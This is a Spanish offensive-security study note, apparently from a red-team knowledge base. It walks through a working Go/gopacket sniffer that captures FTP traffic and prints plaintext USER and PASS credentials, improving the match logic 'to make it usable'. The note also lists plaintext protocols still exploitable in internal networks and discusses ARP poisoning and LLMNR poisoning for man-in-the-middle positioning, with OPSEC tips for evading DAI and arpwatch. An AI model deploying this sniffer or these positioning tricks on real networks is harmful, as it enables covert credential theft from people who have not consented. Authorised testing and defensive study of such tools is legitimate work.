---
tags:
  - Go
  - Go/Redes
  - Sniffing
  - Post-Explotacion
Fecha de actualización: 2026-07-25
Nota previa: "[[00 - gopacket - capturar y filtrar tráfico]]"
Nota siguiente: "[[02 - Escaneo evadiendo SYN cookies]]"
Area: "[[Raw packets.base|Raw packets]]"
---
---

El sniffer mínimo con valor ofensivo: capturar tráfico y pescar credenciales que viajan sin cifrar. Se construye sobre el handle de [[00 - gopacket - capturar y filtrar tráfico]] cambiando dos cosas — el filtro BPF y qué haces con el payload. La metodología completa (qué protocolos, cómo posicionarte, cómo exfiltrar el botín) es Red Team → [[12 - Credenciales en red - tráfico y shares]]; aquí está el motor en Go.

## Extraer el payload de la capa de aplicación

FTP manda `USER` y `PASS` en texto plano por el puerto 21. Filtras solo ese tráfico y, de cada paquete, sacas la capa de aplicación:

```go
var (
    iface   = "eth0"
    snaplen = int32(1600)
    promisc = false
    timeout = pcap.BlockForever
    filter  = "tcp and dst port 21"     // solo comandos FTP hacia el servidor
)

// ... FindAllDevs + OpenLive + SetBPFFilter como en la nota 00 ...

source := gopacket.NewPacketSource(handle, handle.LinkType())
for packet := range source.Packets() {
    app := packet.ApplicationLayer()
    if app == nil {
        continue                        // sin capa L7: SYN, ACK, etc.
    }
    payload := app.Payload()
    if isCredential(payload) {
        fmt.Print(string(payload))
    }
}
```

<mark style="background: #ADCCFFA6;">`packet.ApplicationLayer()` devuelve la carga L7 ya separada de las cabeceras</mark>: para FTP, la línea de comando (`USER bob\r\n`). Filtrar por `dst port 21` te deja solo los comandos del cliente hacia el servidor — que es donde viajan usuario y contraseña.

## La modernización: no generes falsos positivos

El libro busca así:

```go
if bytes.Contains(payload, []byte("USER")) || bytes.Contains(payload, []byte("PASS")) {
    fmt.Print(string(payload))
}
```

Y el propio libro admite el fallo: <mark style="background: #FF5582A6;">`bytes.Contains` casa `USER`/`PASS` en **cualquier** posición</mark> — una transferencia con las palabras `PASSAGE` o `ABUSER`, o un fichero que contenga esas cadenas, dispara un falso positivo. Los comandos FTP van **al inicio de la línea**, así que la corrección es comprobar el prefijo:

```go
func isCredential(payload []byte) bool {
    p := bytes.TrimLeft(payload, " \t")            // por si hay espacios delante
    return bytes.HasPrefix(p, []byte("USER ")) ||
        bytes.HasPrefix(p, []byte("PASS "))
}
```

`bytes.HasPrefix` con el espacio incluido (`"USER "`) elimina el ruido: solo casa cuando la línea **empieza** por el comando real. Es una línea más y convierte un PoC con FP en algo usable.

```shell-session
$ go build -o ftpsniff && sudo ./ftpsniff
USER bob
PASS Sup3rS3cret!
```

## Realidad 2026: dónde queda tráfico en claro

> [!warning]+ Casi todo interesante va por TLS — pero no todo
> En 2026 el sniffing pasivo de credenciales rinde mucho menos que en 2015: HTTP→HTTPS, SMTP/IMAP/POP3 con STARTTLS obligatorio, RDP y SMB cifrados. Aun así <mark style="background: #FFB86CA6;">sigue habiendo bolsas de texto plano explotables</mark>, sobre todo en redes internas y OT/legacy:
> - **FTP (21)** y **Telnet (23)** — vivos en dispositivos de red, NAS e impresoras.
> - **HTTP interno (80)** — paneles de admin, APIs este-oeste sin TLS.
> - **SNMP v1/v2c (161)** — *community strings* en claro.
> - **LDAP simple bind (389)** sin StartTLS, **SMTP/POP3/IMAP** sin STARTTLS.
> - Protocolos industriales (Modbus, etc.) sin cifrado por diseño.
>
> El mismo patrón `ApplicationLayer().Payload()` + `HasPrefix`/regex sirve para todos; solo cambian el filtro BPF y las marcas que buscas.

## El problema de la red conmutada

Un switch entrega cada trama **solo** al puerto destino, así que en modo promiscuo no ves el tráfico ajeno — solo el tuyo. Para capturar credenciales de otros hosts necesitas **posicionarte en el camino**:

- **ARP poisoning** — envenenas la tabla ARP de víctima y gateway para que el tráfico pase por ti (MITM). Es el emparejamiento clásico de este sniffer.
- **Envenenamiento LLMNR/NBT-NS** — [[06 - Envenenamiento LLMNR y NBT-NS]], respondes a resoluciones de nombre para robar hashes NetNTLM.
- **Puerto SPAN/TAP** o una **workstation ya comprometida** cuyo propio tráfico saliente sniffeas (el escenario que asume el libro, sin necesidad de MITM).

> [!important]+ OPSEC: pasivo es sigiloso, el posicionamiento no
> Escuchar no emite un paquete de ataque — el sniffing en sí es **prácticamente indetectable** en red (solo el modo promiscuo puede delatarse con sondas específicas: un paquete a una MAC inexistente al que únicamente responde una NIC en promiscuo). El ruido de verdad está en **cómo llegas a la posición**: <mark style="background: #8000E1A6;">el ARP poisoning es escandaloso</mark> — *gratuitous ARP* masivos, entradas ARP duplicadas, y detección directa por Dynamic ARP Inspection (DAI) o `arpwatch`. Si el objetivo tiene DAI en los switches, el MITM por ARP salta al instante. Sniffear el tráfico local de un host ya comprometido evita todo eso.

Si en vez de tráfico de aplicación te interesan las cabeceras TCP para deducir estado de puertos, el siguiente paso mira los flags → [[02 - Escaneo evadiendo SYN cookies]].
